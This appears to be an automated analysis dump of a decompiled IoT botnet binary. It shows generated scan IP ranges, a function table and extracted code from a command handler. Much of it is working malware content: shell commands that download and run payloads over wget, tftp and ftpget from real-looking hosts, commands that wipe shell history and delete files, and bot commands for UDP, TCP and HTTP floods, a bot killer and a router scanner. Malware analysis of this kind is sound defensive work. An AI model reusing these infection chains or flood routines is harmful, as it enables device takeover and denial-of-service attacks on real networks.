        szprintf(v231, (int32_t)"14.184.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v232, (int32_t)"14.185.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v233, (int32_t)"14.186.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v234, (int32_t)"14.187.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v235, (int32_t)"14.188.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v236, (int32_t)"14.189.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v237, (int32_t)"14.190.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v238, (int32_t)"14.191.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v239, (int32_t)"45.121.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v240, (int32_t)"45.120.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v241, (int32_t)"45.115.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v242, (int32_t)"43.252.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v243, (int32_t)"43.230.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v244, (int32_t)"43.240.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v245, (int32_t)"43.245.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v246, (int32_t)"41.174.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v247, (int32_t)"49.118.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v248, (int32_t)"78.188.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v249, (int32_t)"45.127.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v250, (int32_t)"103.30.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v251, (int32_t)"14.33.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v252, (int32_t)"123.16.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v253, (int32_t)"202.44.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v254, (int32_t)"116.93.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v255, (int32_t)"91.83.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v256, (int32_t)"41.253.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v257, (int32_t)"117.173.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v258, (int32_t)"113.190.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v259, (int32_t)"146.88.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v260, (int32_t)"112.196.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v261, (int32_t)"113.178.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v262, (int32_t)"112.45.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v263, (int32_t)"183.223.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v265, (int32_t)"43.230.%d.%d", (int32_t)v136, (int32_t)v137);

    szprintf(v146, (int32_t)"%d.%d.%d.%d", (int32_t)v135, (int32_t)v138);

        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");

            __libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py");

            __libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py");

        inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
        "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n",

            __libc_system(v138);

            __libc_system(v138);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");

            __libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py");

            __libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py");

            __libc_system((int32_t)"killall -9 python;pkill python");

            __libc_system((int32_t)"cd /.tmp;python good2.py 1000 LUCKY 1 3");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |0   |4514    |463           |763         |
----------------------------------------------------------------------------------------------
_init                                             |0   |959     |161           |0           |
----------------------------------------------------------------------------------------------
sysconf                                           |1   |920     |136           |0           |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |1   |856     |122           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |887     |92            |576         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |1181    |73            |864         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |0   |3461    |47            |3231        |
----------------------------------------------------------------------------------------------
fdpopen                                           |0   |469     |38            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |462     |35            |179         |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |8   |562     |33            |0           |
----------------------------------------------------------------------------------------------
malloc                                            |1   |3698    |30            |2310        |
----------------------------------------------------------------------------------------------
sendUDP                                           |8   |352     |30            |92          |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |888     |29            |701         |
----------------------------------------------------------------------------------------------
prints                                            |4   |487     |28            |28          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |630     |28            |242         |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |532     |23            |326         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1084    |20            |921         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |263     |17            |80          |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |4   |1027    |11            |0           |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |209     |10            |58          |
----------------------------------------------------------------------------------------------
print                                             |3   |448     |10            |288         |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |8   |716     |9             |19          |
----------------------------------------------------------------------------------------------
getCores                                          |0   |161     |9             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |525     |8             |357         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |191     |8             |38          |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |341     |7             |0           |
----------------------------------------------------------------------------------------------
sendCNC                                           |3   |163     |7             |0           |
----------------------------------------------------------------------------------------------
negotiate                                         |3   |194     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |180     |7             |26          |
----------------------------------------------------------------------------------------------
NetisRanges                                       |1   |151     |6             |0           |
----------------------------------------------------------------------------------------------
recvLine                                          |0   |261     |6             |83          |
----------------------------------------------------------------------------------------------
UpdateBins                                        |1   |154     |6             |0           |
----------------------------------------------------------------------------------------------
memrchr                                           |3   |316     |6             |124         |
----------------------------------------------------------------------------------------------
realloc                                           |4   |452     |6             |0           |
----------------------------------------------------------------------------------------------
fdpclose                                          |0   |194     |6             |24          |
----------------------------------------------------------------------------------------------
sleep                                             |1   |239     |6             |93          |
----------------------------------------------------------------------------------------------
NetisScanner                                      |0   |151     |6             |8           |
----------------------------------------------------------------------------------------------
inet_pton                                         |4   |439     |5             |253         |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |219     |5             |35          |
----------------------------------------------------------------------------------------------
printi                                            |1   |240     |5             |23          |
----------------------------------------------------------------------------------------------
abort                                             |0   |217     |4             |75          |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |236     |4             |88          |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |170     |4             |0           |
----------------------------------------------------------------------------------------------
strstr                                            |2   |276     |4             |119         |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |4   |537     |4             |91          |
----------------------------------------------------------------------------------------------
botkiller                                         |0   |162     |3             |20          |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |245     |3             |59          |
----------------------------------------------------------------------------------------------
ClearHistory                                      |0   |142     |3             |0           |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |173     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |170     |3             |17          |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |197     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |195     |3             |0           |
----------------------------------------------------------------------------------------------
sockprintf                                        |2   |148     |3             |0           |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |150     |2             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |2   |211     |2             |61          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |173     |2             |16          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |4   |195     |2             |45          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |197     |2             |52          |
----------------------------------------------------------------------------------------------
__malloc_consolidate                              |1   |286     |2             |122         |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |4   |220     |2             |74          |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |177     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |4   |218     |2             |60          |
----------------------------------------------------------------------------------------------
rawmemchr                                         |4   |233     |2             |25          |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |4   |202     |2             |49          |
----------------------------------------------------------------------------------------------
__GI_vfprintf                                     |3   |191     |2             |0           |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |186     |2             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |240     |2             |34          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |4   |820     |2             |661         |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |4   |234     |2             |71          |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |245     |2             |94          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |191     |2             |31          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |154     |2             |0           |
----------------------------------------------------------------------------------------------
trim                                              |0   |201     |2             |56          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |178     |2             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |209     |2             |37          |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_clock_getres                                 |5   |151     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |156     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |1   |152     |1             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |268     |1             |22          |
----------------------------------------------------------------------------------------------
wait4                                             |4   |154     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |0   |154     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |2   |141     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |2   |140     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |141     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |139     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |239     |1             |39          |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |139     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |145     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |148     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |139     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |164     |1             |17          |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |143     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |2   |199     |1             |35          |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |4   |166     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |151     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |140     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |165     |1             |19          |
----------------------------------------------------------------------------------------------
socket                                            |3   |139     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |218     |1             |34          |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |150     |1             |0           |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |182     |1             |28          |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |3   |139     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |140     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |170     |1             |28          |
----------------------------------------------------------------------------------------------
_fini                                             |0   |142     |1             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |152     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |1   |316     |1             |80          |
----------------------------------------------------------------------------------------------
getdtablesize                                     |0   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |152     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |141     |1             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |1   |141     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |0   |141     |1             |0           |
----------------------------------------------------------------------------------------------
__raise                                           |1   |140     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |140     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |139     |1             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |187     |1             |27          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |161     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |139     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |3   |219     |1             |56          |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |0   |145     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |140     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |0   |171     |1             |21          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |140     |1             |0           |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |7   |216     |1             |47          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |167     |1             |18          |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |4   |166     |1             |20          |
----------------------------------------------------------------------------------------------
szprintf                                          |4   |141     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |140     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |0   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |0   |176     |1             |18          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |153     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |2   |181     |1             |22          |
----------------------------------------------------------------------------------------------
sprintf                                           |4   |141     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |139     |1             |0           |
----------------------------------------------------------------------------------------------
strnlen                                           |0   |169     |1             |18          |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |169     |1             |18          |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_trim                                     |0   |181     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |0   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |4   |234     |0             |0           |
----------------------------------------------------------------------------------------------
function_8048120                                  |0   |152     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |151     |0             |0           |
----------------------------------------------------------------------------------------------
mmap                                              |8   |143     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |0   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |4   |151     |0             |0           |
----------------------------------------------------------------------------------------------
munmap                                            |4   |152     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |161     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |149     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_largebin_index                           |0   |159     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |181     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |0   |151     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |4   |355     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |1   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |3   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |4   |151     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |2   |152     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |139     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |3   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |5   |151     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |2   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |0   |142     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |206     |0             |0           |
----------------------------------------------------------------------------------------------
free                                              |1   |336     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |192     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |150     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |149     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |171     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |1   |152     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |4   |238     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |152     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |5   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |142     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |0   |144     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |0   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |159     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |3   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |142     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |151     |0             |0           |
----------------------------------------------------------------------------------------------
malloc_trim                                       |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |152     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |3   |151     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |212     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |152     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |4   |153     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |140     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |4   |226     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__get_pc_thunk_bx                                 |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |4   |319     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |0   |159     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |3   |285     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |2   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |192     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |153     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |149     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |3   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |0   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |4   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |4   |140     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |4   |147     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |0   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |0   |162     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |143     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |171     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |153     |0             |0           |
----------------------------------------------------------------------------------------------
mremap                                            |6   |154     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |160     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |166     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |3   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |4   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |0   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |141     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |3   |170     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |0   |278     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |3   |162     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |3   |140     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |158     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |0   |152     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 13956
++++++++ FUNCTION END 18470
++++++++ FUNCTION LENGTH 4514
            __libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py");
            sockprintf(v142, (int32_t)"INSTALLING PYTHON SCANNER");
            __libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py");
            sockprintf(v142, (int32_t)"UPDATING PYTHON SCANNER");
            __libc_system((int32_t)"killall -9 python;pkill python");
            sockprintf(v142, (int32_t)"STOPPING PYTHON SCANNER");
            __libc_system((int32_t)"cd /.tmp;python good2.py 1000 LUCKY 1 3");
            sockprintf(v142, (int32_t)"STARTING VOIDS HACKA SCANNA");
        v241 = _strncmp((char *)*v132, "PING", 5);
                            kill(v158, 9);
                            sockprintf(v142, (int32_t)"STOPPING SCANNER");
                            result2 = __libc_fork(3);
                            __GI_inet_ntoa(v143);
                            sockprintf(v142, (int32_t)"STARTING SCANNER ON -> %s");
                    v253 = _strncmp((char *)*v132, "NETIS", 6);
                            kill(v162, 9);
                            __GI_inet_ntoa(v143);
                            sockprintf(v142, (int32_t)"STOPPING NETIS SCANNER");
                            result3 = __libc_fork(3);
                            __GI_inet_ntoa(v143);
                            sockprintf(v142, (int32_t)"STARTING NETIS SCANNER");
                            NetisScanner();
                        if (listFork() == 0) {
                            __GI_inet_ntoa(v143);
                            sockprintf(v142, (int32_t)"COMMENCING BOT KILL ON -> %s");
                            botkiller();
                    v261 = _strncmp((char *)*v132, "GETPUBLICIP", 12);
                        v263 = _strncmp((char *)*v132, "UDP", 4);
                            v265 = _strncmp((char *)*v132, "TCP", 4);
                                v267 = _strncmp((char *)*v132, "HTTP", 5);
                                        result5 = listFork();
                                            sendHTTP(*v199, v236, (int16_t)v205, v234, v204, v203);
                                                v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                    while (true) {
                                                                v295 = listFork();
                                                                    sendSTD(v239, (int16_t)v212, v213);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendSTD(v240, (int16_t)v212, v213);
                                                                v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                    while (true) {
                                                result6 = sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                        result7 = listFork();
                                                            sendCNC(v237, v208, v209);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendCNC(v238, v208, v209);
                                                            __libc_close(v142);
                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                            while (true) {
